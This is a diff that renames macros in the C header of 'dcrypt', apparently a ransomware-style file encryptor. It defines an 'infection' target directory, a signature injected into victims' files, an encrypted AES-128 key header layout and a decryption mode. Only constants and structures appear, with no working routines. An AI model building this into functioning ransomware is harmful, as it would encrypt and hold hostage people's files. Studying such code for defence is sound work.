@@ -23,59 +23,59 @@
 /*------------------------ Defines, enum, struct --------------------------*/
 
 // About the program
-# define DCPROG_VERSION        "1.1.3"
-# define DCPROG_AUTHOR         "d."
-# define DCPROG_NAME           "dcrypt"
+# define DC_PROG_VERSION        "1.1.3"
+# define DC_PROG_AUTHOR         "d."
+# define DC_PROG_NAME           "dcrypt"
 
 // Paths of the target directories
-# define DCTARGET_ARRAY_SIZE   1
-# define DCTARGET_PATHS        { "/home/mint/infection/" }
+# define DC_TARGET_ARRAY_SIZE   1
+# define DC_TARGET_PATHS        { "/home/mint/infection/" }
 
 // Unhandled paths
-# define DCUNHANDLED_DIRS_ARRAY_SIZE   2
-# define DCUNHANDLED_DIRS      { ".", ".." }
+# define DC_UNHANDLED_DIRS_ARRAY_SIZE   2
+# define DC_UNHANDLED_DIRS      { ".", ".." }
 
 // Returns
 enum e_returns
 {
-    DCSUCCESS,
-    DCERROR
+    DC_SUCCESS,
+    DC_ERROR
 };
 
 // Maximum amount of handled files on a directory
-# define DCMAX_FILES           1024
+# define DC_MAX_FILES           1024
 
 // Charset used for the encryption key
-# define DCKEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
+# define DC_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                 "0123456789"
 
 // Signature injected in the target files's dcrypt header
-# define DCSIGNATURE           "TODCRYPT"
-# define DCDCRYPT_EXT          "dcrypt"
-# define DCDCRYPT_EXT_SIZE     3
-# define DCAES_KEY_SIZE        16
-# define DCAES_BLOCK_SIZE      16
+# define DC_SIGNATURE           "TODCRYPT"
+# define DC_DCRYPT_EXT          "dcrypt"
+# define DC_DCRYPT_EXT_SIZE     3
+# define DC_AES_KEY_SIZE        16
+# define DC_AES_BLOCK_SIZE      16
 
 enum e_modes
 {
     // Display detailed notifications
-    DCVERBOSE                  = 1,
-    DCREVERSE                  = 2
+    DC_VERBOSE                  = 1,
+    DC_REVERSE                  = 2
 };
 
 enum e_dcrypt_header
 {
-    DCDCRYPT_HEADER_SIZE       = 0x0118,
-    DCMAGICNBR_SIZE            = 8,
-    DCENCRYPT_KEY_SIZE         = 256,
+    DC_DCRYPT_HEADER_SIZE       = 0x0118,
+    DC_MAGICNBR_SIZE            = 8,
+    DC_ENCRYPT_KEY_SIZE         = 256,
 
     // Header offsets
-    DCHDR_OFF_SIGN             = 0x0,
-    DCHDR_OFF_ENCRYPT_KEY_SIZE = 0x8,
-    DCHDR_OFF_ENCRYPT_KEY      = 0xc,
-    DCHDR_OFF_FILETYPE         = 0x10c,
-    DCHDR_OFF_FILESIZE         = 0x110
+    DC_HDR_OFF_SIGN             = 0x0,
+    DC_HDR_OFF_ENCRYPT_KEY_SIZE = 0x8,
+    DC_HDR_OFF_ENCRYPT_KEY      = 0xc,
+    DC_HDR_OFF_FILETYPE         = 0x10c,
+    DC_HDR_OFF_FILESIZE         = 0x110
 };
 
 /*
@@ -86,7 +86,7 @@ enum e_dcrypt_header
 typedef struct s_dcrypt_header
 {
     // 0x0000 Magic value/signature to identify encrypted files.
-    uint8_t     signature[DCMAGICNBR_SIZE];
+    uint8_t     signature[DC_MAGICNBR_SIZE];
 
     /*
      * 0x0008 Size (in bytes) of the encrypted AES key.
@@ -103,7 +103,7 @@ typedef struct s_dcrypt_header
      * AES-128 key is stored.
      */
 
-    uint8_t     encryption_key[DCENCRYPT_KEY_SIZE];
+    uint8_t     encryption_key[DC_ENCRYPT_KEY_SIZE];
 
     /*
      * 0x010C File type internal to this program.
